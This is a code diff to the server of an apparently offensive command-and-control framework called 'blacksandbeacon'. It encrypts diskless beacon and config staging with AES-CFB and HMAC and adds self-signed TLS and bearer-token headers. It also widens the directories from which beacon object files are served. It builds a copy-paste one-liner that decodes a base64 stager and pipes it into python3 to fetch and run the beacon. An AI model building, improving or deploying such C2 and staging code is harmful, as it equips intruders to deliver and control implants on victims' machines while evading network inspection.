@@ -33,6 +33,7 @@ import sys
 import threading
 import time
 from concurrent.futures import ThreadPoolExecutor
+from datetime import datetime, timedelta, timezone
 from pathlib import Path
 from typing import Optional, Dict, Any
 from urllib.parse import unquote, urlparse, urlunparse
@@ -81,6 +82,79 @@ def _random_free_port() -> int:
         except OSError:
             continue
     raise RuntimeError("could not find a free port for the C2")
+
+
+def _ensure_stage_tls(cfg: Dict[str, Any]) -> None:
+    """Auto-provision TLS for staging to avoid plaintext token/header exposure.
+
+    Creates a self-signed cert under sessions/tls/ when staging token is
+    explicitly configured (or BSB_STAGE_AUTO_TLS=1) and no cert/key provided.
+    Does not force TLS for implicitly-generated staging tokens to avoid
+    breaking existing HTTP configs/tests.
+    """
+    if not cfg.get("stage_token"):
+        return
+    if cfg.get("tls_cert") and cfg.get("tls_key"):
+        return
+    if not cfg.get("_stage_token_provided") and os.environ.get("BSB_STAGE_AUTO_TLS") != "1":
+        return
+    tls_dir = ROOT / "sessions" / "tls"
+    tls_dir.mkdir(parents=True, exist_ok=True)
+    cert_path = tls_dir / "stage.crt"
+    key_path = tls_dir / "stage.key"
+    if not (cert_path.is_file() and key_path.is_file()):
+        try:
+            from cryptography import x509
+            from cryptography.x509.oid import NameOID
+            from cryptography.hazmat.primitives import hashes, serialization
+            from cryptography.hazmat.primitives.asymmetric import rsa
+
+            key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+            subject = issuer = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, u"blacksandbeacon-stage")])
+            now = datetime.now(timezone.utc)
+            cert = (
+                x509.CertificateBuilder()
+                .subject_name(subject)
+                .issuer_name(issuer)
+                .public_key(key.public_key())
+                .serial_number(x509.random_serial_number())
+                .not_valid_before(now - timedelta(minutes=1))
+                .not_valid_after(now + timedelta(days=365))
+                .add_extension(
+                    x509.SubjectAlternativeName([
+                        x509.DNSName(u"localhost"),
+                        x509.IPAddress(__import__('ipaddress').ip_address("127.0.0.1")),
+                    ]),
+                    critical=False,
+                )
+                .sign(key, hashes.SHA256())
+            )
+            key_path.write_bytes(
+                key.private_bytes(
+                    encoding=serialization.Encoding.PEM,
+                    format=serialization.PrivateFormat.TraditionalOpenSSL,
+                    encryption_algorithm=serialization.NoEncryption(),
+                )
+            )
+            os.chmod(key_path, 0o600)
+            cert_path.write_bytes(cert.public_bytes(serialization.Encoding.PEM))
+            logging.info("generated self-signed staging TLS cert: %s", cert_path)
+        except Exception as e:
+            logging.warning("failed to auto-generate staging TLS cert: %s", e)
+            return
+    cfg["tls_cert"] = str(cert_path)
+    cfg["tls_key"] = str(key_path)
+    cfg["stage_tls_autogen"] = True
+    u = urlparse(str(cfg.get("url", "")))
+    host = u.hostname or "127.0.0.1"
+    if u.port:
+        netloc = f"{host}:{u.port}"
+    elif cfg.get("port"):
+        netloc = f"{host}:{cfg['port']}"
+    else:
+        netloc = host
+    cfg["url"] = urlunparse(("https", netloc, u.path or "", "", "", ""))
+
 
 
 def load_runtime_config() -> Dict[str, Any]:
@@ -182,6 +256,7 @@ def load_runtime_config() -> Dict[str, Any]:
     token_provided = bool((raw.get("server", {}) or {}).get("stage_token")) or bool(
         os.environ.get("BSB_STAGE_TOKEN")
     )
+    out["_stage_token_provided"] = token_provided
     if not token_provided:
         out["stage_token"] = secrets.token_hex(16)
         out["generated"]["stage_token"] = out["stage_token"]
@@ -192,6 +267,8 @@ def load_runtime_config() -> Dict[str, Any]:
     else:
         out["client_id"] = "bsb-" + secrets.token_hex(4)
         out["generated"]["client_id"] = out["client_id"]
+
+    _ensure_stage_tls(out)
 
     # Use derived encryption key if available, else fall back to legacy aes_key_hex
     if out.get("encryption_key"):
@@ -371,33 +448,29 @@ def decrypt_data_replay(
 # --- Staging: diskless beacon/config delivery -------------------------------
 #
 # Endpoint contract:
-#   GET /stage/beacon/<token>  -> packed beacon ELF
-#   GET /stage/config/<token>  -> packed config.json
+#   GET /stage/beacon  (Authorization: Bearer <token>) -> encrypted beacon ELF
+#   GET /stage/config  (Authorization: Bearer <token>) -> encrypted config.json
 #
-# Packing: three XOR layers whose keys are DERIVED from the staging token
-# via HKDF-SHA256 (salt "blacksandbeacon-stage-v1", info stage-l1/2/3).
-# The response body is just base64(xor3(payload)) — no keys on the wire,
-# so captured traffic cannot be decoded without the token.
+# Protection: AES-256-CFB with HKDF-SHA256 derived enc/hmac keys from the
+# staging token (salt "blacksandbeacon-stage-v2"). Random IV per response and
+# HMAC-SHA256 authentication. Response body: base64(iv + ciphertext + tag).
 #
-# Security note (honest): the token is the access gate AND the packing
-# key material. XOR layers are string obfuscation, NOT cryptography —
-# anyone holding the token decodes everything. The token rides in the
-# URL, so deploy behind TLS (server.tls_cert / server.tls_key) or assume
-# it is exposed to anyone who can capture traffic. The AES keys inside
-# config.json are the real operational secret; rotate after engagement.
-# Without a configured stage_token the endpoints fail closed.
+# Security note: token is the access gate and key material source. Send over TLS
+# (server.tls_cert / server.tls_key) in production to protect token/header and
+# metadata. Without a configured stage_token the endpoints fail closed.
 
+STAGE_BEACON_PATH = "/stage/beacon"
+STAGE_CONFIG_PATH = "/stage/config"
+# Legacy path-prefix forms kept for compatibility with older stagers/tests.
 STAGE_BEACON_PREFIX = "/stage/beacon/"
 STAGE_CONFIG_PREFIX = "/stage/config/"
-STAGE_KEY_COUNT = 3
-STAGE_KEY_LEN = 32
-STAGE_HKDF_SALT = b"blacksandbeacon-stage-v1"
-STAGE_HKDF_INFOS = (b"stage-l1", b"stage-l2", b"stage-l3")
+STAGE_HKDF_SALT = b"blacksandbeacon-stage-v2"
+STAGE_HKDF_INFO_ENC = b"stage-enc"
+STAGE_HKDF_INFO_HMAC = b"stage-hmac"
 
 
 def hkdf_sha256(ikm: bytes, salt: bytes, info: bytes, length: int = 32) -> bytes:
-    """RFC 5869 HKDF extract+expand. Pure stdlib so the server and the
-    stager payload implement byte-identical derivation."""
+    """RFC 5869 HKDF extract+expand. Pure stdlib for parity with stager."""
     prk = hmac.new(salt, ikm, hashlib.sha256).digest()
     out, t, counter = b"", b"", 1
     while len(out) < length:
@@ -407,33 +480,42 @@ def hkdf_sha256(ikm: bytes, salt: bytes, info: bytes, length: int = 32) -> bytes
     return out[:length]
 
 
-def stage_keys(token: str) -> list:
-    """Derive the three staging XOR layers from the token."""
+def stage_keys(token: str) -> tuple[bytes, bytes]:
+    """Derive staging encryption and HMAC keys from token."""
     ikm = (token or "").encode("utf-8")
-    return [hkdf_sha256(ikm, STAGE_HKDF_SALT, info, STAGE_KEY_LEN) for info in STAGE_HKDF_INFOS]
-
-
-def xor_layer(data: bytes, key: bytes) -> bytes:
-    """Apply one XOR layer with a repeating key."""
-    klen = len(key)
-    return bytes(b ^ key[i % klen] for i, b in enumerate(data))
+    enc = hkdf_sha256(ikm, STAGE_HKDF_SALT, STAGE_HKDF_INFO_ENC)
+    mac = hkdf_sha256(ikm, STAGE_HKDF_SALT, STAGE_HKDF_INFO_HMAC)
+    return enc, mac
 
 
 def stage_encode(payload: bytes, token: str) -> bytes:
-    """Pack payload as base64 using token-derived XOR keys."""
-    data = payload
-    for k in stage_keys(token):
-        data = xor_layer(data, k)
-    return base64.b64encode(data) + b"\r\n"
+    """Encrypt payload with AES-256-CFB + HMAC-SHA256 using token-derived keys."""
+    enc_key, mac_key = stage_keys(token)
+    iv = os.urandom(16)
+    cipher = Cipher(algorithms.AES(enc_key), modes.CFB(iv), backend=default_backend())
+    encryptor = cipher.encryptor()
+    ciphertext = encryptor.update(payload) + encryptor.finalize()
+    body = iv + ciphertext
+    tag = hmac.new(mac_key, body, hashlib.sha256).digest()
+    return base64.b64encode(body + tag) + b"\r\n"
 
 
 def stage_decode(body: bytes, token: str) -> Optional[bytes]:
-    """Inverse of stage_encode (used by tests and the stager parity check)."""
+    """Decrypt/verify staging payload. Returns None on auth/decrypt failure."""
     try:
-        data = base64.b64decode(body.strip())
-        for k in reversed(stage_keys(token)):
-            data = xor_layer(data, k)
-        return data
+        raw = base64.b64decode(body.strip())
+        if len(raw) < 16 + 32:
+            return None
+        tag = raw[-32:]
+        body = raw[:-32]
+        enc_key, mac_key = stage_keys(token)
+        expected = hmac.new(mac_key, body, hashlib.sha256).digest()
+        if not hmac.compare_digest(tag, expected):
+            return None
+        iv, ciphertext = body[:16], body[16:]
+        cipher = Cipher(algorithms.AES(enc_key), modes.CFB(iv), backend=default_backend())
+        decryptor = cipher.decryptor()
+        return decryptor.update(ciphertext) + decryptor.finalize()
     except Exception:
         return None
 
@@ -513,16 +595,16 @@ def build_stage_oneliner(cfg: Dict[str, Any]) -> str:
     """Build the copy-paste stager one-liner for the current config.
 
     The stager payload (c2/stage_payload.py) reads URL and token from
-    environment variables, so its base64 blob is constant and the
-    one-liner is a plain pipe: decode payload, run it with env vars set.
+    environment variables and sends token via Authorization header.
     """
     payload = STAGE_PAYLOAD_PATH.read_bytes()
     blob = base64.b64encode(payload).decode()
     url = str(cfg.get("url", "")).rstrip("/")
     token = str(cfg.get("stage_token", ""))
+    insecure = " BSB_STAGE_INSECURE_TLS=1" if cfg.get("stage_tls_autogen") else ""
     return (
         f"echo {blob} | base64 -d | "
-        f"BSB_STAGE_URL='{url}' BSB_STAGE_TOKEN='{token}' python3 -"
+        f"BSB_STAGE_URL='{url}' BSB_STAGE_TOKEN='{token}'{insecure} python3 -"
     )
 
 
@@ -680,41 +762,50 @@ def handle_report(state: C2State, b64_payload: str) -> bytes:
 
 
 def handle_bof(state: C2State, name: str) -> bytes:
-    """Serve BOF file from upload directory with path traversal protection."""
-    # Check for null bytes early
+    """Serve BOF file with path traversal protection.
+
+    Looks up by basename in configured upload_dir and common locations
+    (cwd, C2 dir, project root, build/bof) so dropping a .o next to the
+    server or in build artifacts works out of the box.
+    """
     if "\x00" in name:
         return b"BOF_NOT_FOUND\r\n"
-    
-    # Resolve upload directory to absolute path (handles symlinks)
-    upload_dir_real = os.path.realpath(state.cfg["upload_dir"])
-    
-    # Get the requested file name (basename only, no directory components)
+
     safe = os.path.basename(name)
     if not safe or safe in (".", ".."):
         return b"BOF_NOT_FOUND\r\n"
-    
-    # Construct the requested path
-    requested_path = os.path.join(state.cfg["upload_dir"], safe)
-    
-    # Resolve the requested path to absolute path (handles symlinks)
-    requested_real = os.path.realpath(requested_path)
-    
-    # Verify the requested file is within the upload directory
-    # Use os.path.commonpath or startswith with proper separator
-    if not requested_real.startswith(upload_dir_real + os.sep) and requested_real != upload_dir_real:
-        return b"BOF_NOT_FOUND\r\n"
-    
-    # Verify it's a regular file (not a directory, symlink to outside, etc.)
-    if not os.path.isfile(requested_real):
-        return b"BOF_NOT_FOUND\r\n"
-    
-    # Verify the file is actually inside the upload directory (not a symlink pointing outside)
-    # The realpath check above already handles this, but double-check
-    if not os.path.commonpath([upload_dir_real, requested_real]) == upload_dir_real:
-        return b"BOF_NOT_FOUND\r\n"
-    
-    with open(requested_real, "rb") as f:
-        return base64.b64encode(f.read()) + b"\r\n"
+
+    search_dirs = []
+    for d in [
+        state.cfg.get("upload_dir"),
+        os.getcwd(),
+        str(ROOT / "c2"),
+        str(ROOT),
+        str(ROOT / "sessions" / "uploads"),
+        str(ROOT / "build" / "bof"),
+        str(ROOT / "bof"),
+    ]:
+        if not d:
+            continue
+        rd = os.path.realpath(d)
+        if rd not in search_dirs and os.path.isdir(rd):
+            search_dirs.append(rd)
+
+    for base in search_dirs:
+        requested_path = os.path.join(base, safe)
+        requested_real = os.path.realpath(requested_path)
+        try:
+            if os.path.commonpath([base, requested_real]) != base:
+                continue
+        except Exception:
+            continue
+        if os.path.isfile(requested_real):
+            with open(requested_real, "rb") as f:
+                logging.info("bof: serving %s from %s", safe, requested_real)
+                return base64.b64encode(f.read()) + b"\r\n"
+
+    logging.warning("bof: %s not found (searched: %s)", safe, ", ".join(search_dirs))
+    return b"BOF_NOT_FOUND\r\n"
 
 
 def handle_request(state: C2State, selector: str) -> bytes:
@@ -750,6 +841,18 @@ def handle_request(state: C2State, selector: str) -> bytes:
                 return handle_report(state, payload)
             if method == "GET" and path.startswith("/bof/"):
                 return handle_bof(state, unquote(path[len("/bof/") :]))
+            auth_token = ""
+            for line in head.split("\r\n")[1:]:
+                name, _, value = line.partition(":")
+                if name.strip().lower() == "authorization":
+                    v = value.strip()
+                    if v.lower().startswith("bearer "):
+                        auth_token = v[7:].strip()
+                    break
+            if method == "GET" and path in (STAGE_BEACON_PATH, STAGE_CONFIG_PATH):
+                kind = "beacon" if path == STAGE_BEACON_PATH else "config"
+                return handle_stage(state, kind, auth_token)
+            # Legacy: token in path (kept for compatibility)
             if method == "GET" and path.startswith(STAGE_BEACON_PREFIX):
                 return handle_stage(
                     state, "beacon", unquote(path[len(STAGE_BEACON_PREFIX) :]).strip()
@@ -929,6 +1032,29 @@ def serve(cfg: Dict[str, Any], state: C2State):
         executor.shutdown(wait=False)
 
 
+def _sync_bofs_to_upload_dir(cfg: Dict[str, Any]) -> int:
+    """Copy build/bof artifacts into upload_dir so /bof/<name> serves them."""
+    src = ROOT / "build" / "bof"
+    dst = Path(cfg.get("upload_dir") or (ROOT / "sessions" / "uploads"))
+    try:
+        dst.mkdir(parents=True, exist_ok=True)
+    except Exception:
+        return 0
+    if not src.is_dir():
+        return 0
+    n = 0
+    for p in src.glob("*.o"):
+        try:
+            target = dst / p.name
+            if not target.exists() or target.stat().st_mtime < p.stat().st_mtime or target.stat().st_size != p.stat().st_size:
+                shutil.copy2(p, target)
+                n += 1
+        except Exception:
+            continue
+    return n
+
+
+
 def command_injector(state: C2State):
     """Interactive command injection REPL."""
     print("\nC2 Command Injector (Ctrl+D to exit)")
@@ -968,6 +1094,10 @@ def main():
     print(f"[*] Log dir: {cfg['log_dir']}")
     print(f"[*] Upload dir: {cfg['upload_dir']}")
 
+    synced = _sync_bofs_to_upload_dir(cfg)
+    if synced:
+        print(f"[*] Synced {synced} BOF(s) from build/bof -> {cfg['upload_dir']}")
+
     gen = cfg.get("generated") or {}
     if gen:
         print("[*] Random runtime values (not provided; fresh every run):")
@@ -975,6 +1105,13 @@ def main():
             print(f"    {k}: {v}")
 
     if cfg.get("stage_token"):
+        if cfg.get("stage_tls_autogen"):
+            print("[*] Staging TLS: auto-generated self-signed cert (sessions/tls). Transport encrypted.")
+            print("[*] One-liner sets BSB_STAGE_INSECURE_TLS=1 (lab, self-signed trust). "
+                  "Set server.tls_cert/tls_key for CA-trusted TLS.")
+        elif not (cfg.get("tls_cert") and cfg.get("tls_key")):
+            print("[!] Staging enabled without TLS (server.tls_cert/tls_key). "
+                  "Token/header and payload metadata may be exposed on the wire.")
         oneliner = build_stage_oneliner(cfg)
         print("[*] Staging enabled (diskless beacon delivery)")
         print("[*] Stager one-liner:")
